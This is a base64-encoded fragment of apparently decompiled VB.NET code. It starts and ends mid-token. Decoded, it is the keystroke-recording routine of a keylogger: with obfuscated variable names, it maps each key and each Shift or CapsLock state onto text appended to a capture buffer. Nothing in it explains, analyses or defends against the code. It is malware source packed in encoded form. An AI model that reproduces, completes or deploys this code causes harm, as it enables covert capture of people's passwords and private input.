c2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkFkZCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIrIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuTXVsdGlwbHkgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiKiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkNvbnRyb2xLZXkgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0NUUkxdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuQWx0IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltBTFRdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuUGFnZVVwIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltQYWdlIFVwXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlBhZ2VEb3duIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltQYWdlIERvd25dIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuSG9tZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbSG9tZV0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5JbnNlcnQgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0luc2VydF0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5FbmQgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0VuZF0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5Fc2NhcGUgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0VzY10iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5QcmludFNjcmVlbiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbUHJ0IFNjcmVlbl0iDQogICAgICAgICAgICBFbmQgSWYNCg0KICAgICAgICBFbHNlSWYgTXkuQ29tcHV0ZXIuS2V5Ym9hcmQuU2hpZnRLZXlEb3duID0gRmFsc2UgQW5kIE15LkNvbXB1dGVyLktleWJvYXJkLkNhcHNMb2NrID0gVHJ1ZSBUaGVuDQogICAgICAgICAgICBJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkEgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiQSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkIgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiQiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkMgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiQyINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiRCINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkUgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiRSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkYgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiRiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkcgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiRyINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkggVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiSCINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkkgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiSSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkogVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiSiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLksgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiSyINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkwgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiTCINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLk0gVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiTSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLk4gVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiTiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLk8gVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiTyINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlAgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiUCINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlEgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiUSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlIgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiUiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlMgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiUyINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlQgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiVCINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlUgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiVSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlYgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiViINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlcgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiVyINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlggVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiWCINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlkgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiWSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlogVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiWiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQwIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjAiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5EMSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIxIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRDIgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiMiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQzIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjMiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5ENCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICI0Ig0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRDUgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiNSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQ2IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjYiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5ENyBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICI3Ig0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRDggVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiOCINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQ5IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjkiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQwIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjAiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQxIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjEiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQyIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjIiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQzIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjMiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQ0IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjQiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQ1IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjUiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQ2IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjYiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQ3IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjciDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQ4IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjgiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQ5IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjkiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PZW1jb21tYSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIsIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtTWludXMgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiLSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLk9lbVF1b3RlcyBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICInIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtT3BlbkJyYWNrZXRzIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIlsiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PZW1DbG9zZUJyYWNrZXRzIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIl0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PZW1RdWVzdGlvbiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIvIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtUGlwZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJcIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtMSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICI7Ig0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtUGVyaW9kIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIi4iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PZW10aWxkZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJgIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuU3BhY2UgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiICINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkVudGVyIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gdmJOZXdMaW5lDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GMSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjFdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRjIgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0YyXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkYzIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltGM10iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GNCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjRdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRjUgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0Y1XSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkY2IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltGNl0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GNyBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjddIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRjggVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0Y4XSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkY5IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltGOV0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GMTAgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0YxMF0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GMTEgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0YxMV0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GMTIgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0YxMl0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5EZWxldGUgVGhlbg0KICAgICAgICAgICAgICAgIElmIE5vdCBbNTRdLlRleHQuRW5kc1dpdGgodmJOZXdMaW5lKSBUaGVuDQogICAgICAgICAgICAgICAgICAgIElmIE5vdCBbNTRdLlRleHQuRW5kc1dpdGgoInwiKSBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICBJZiBOb3QgWzU0XS5UZXh0LkVuZHNXaXRoKCJdIikgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9IFs1NF0uVGV4dC5TdWJzdHJpbmcoMCwgWzU0XS5UZXh0Lkxlbmd0aCAtIDEpDQogICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5CYWNrIFRoZW4NCiAgICAgICAgICAgICAgICBJZiBOb3QgWzU0XS5UZXh0LkVuZHNXaXRoKHZiTmV3TGluZSkgVGhlbg0KICAgICAgICAgICAgICAgICAgICBJZiBOb3QgWzU0XS5UZXh0LkVuZHNXaXRoKCJ8IikgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgSWYgTm90IFs1NF0uVGV4dC5FbmRzV2l0aCgiXSIpIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBbNTRdLlRleHQgPSBbNTRdLlRleHQuU3Vic3RyaW5nKDAsIFs1NF0uVGV4dC5MZW5ndGggLSAxKQ0KICAgICAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRG93biBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5VcCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5MZWZ0IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlJpZ2h0IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlRhYiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbVEFCXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkVuZCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRU5EXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkVzY2FwZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRVNDXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkRpdmlkZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIvIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRGVjaW1hbCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIuIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuU3VidHJhY3QgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiLSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkFkZCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIrIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuTXVsdGlwbHkgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiKiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkNvbnRyb2xLZXkgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0NUUkxdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuQWx0IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltBTFRdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuUGFnZVVwIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltQYWdlIFVwXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlBhZ2VEb3duIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltQYWdlIERvd25dIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuSG9tZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbSG9tZV0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5JbnNlcnQgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0luc2VydF0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5FbmQgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0VuZF0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5Fc2NhcGUgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0VzY10iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5QcmludFNjcmVlbiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbUHJ0IFNjcmVlbl0iDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgRWxzZUlmIE15LkNvbXB1dGVyLktleWJvYXJkLlNoaWZ0S2V5RG93biA9IFRydWUgQW5kIE15LkNvbXB1dGVyLktleWJvYXJkLkNhcHNMb2NrID0gVHJ1ZSBUaGVuDQogICAgICAgICAgICBJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQxIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIiEiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5EMiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJAIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRDMgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiIyINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQ0IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIiQiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5ENSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIlIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRDYgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiXiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQ3IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIiYiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5EOCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIqIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRDkgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiKCINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQwIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIikiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5BIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIkEiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5CIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIkIiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5DIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIkMiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5EIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIkQiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5FIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIkUiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIkYiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5HIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIkciDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5IIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIkgiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5JIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIkkiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5KIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIkoiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1